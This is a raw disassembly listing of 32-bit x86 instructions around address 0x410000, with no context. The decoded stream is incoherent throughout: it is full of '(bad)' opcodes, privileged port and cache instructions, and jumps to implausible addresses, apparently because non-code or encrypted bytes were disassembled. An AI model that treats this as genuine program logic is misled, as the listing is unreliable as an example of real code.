  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
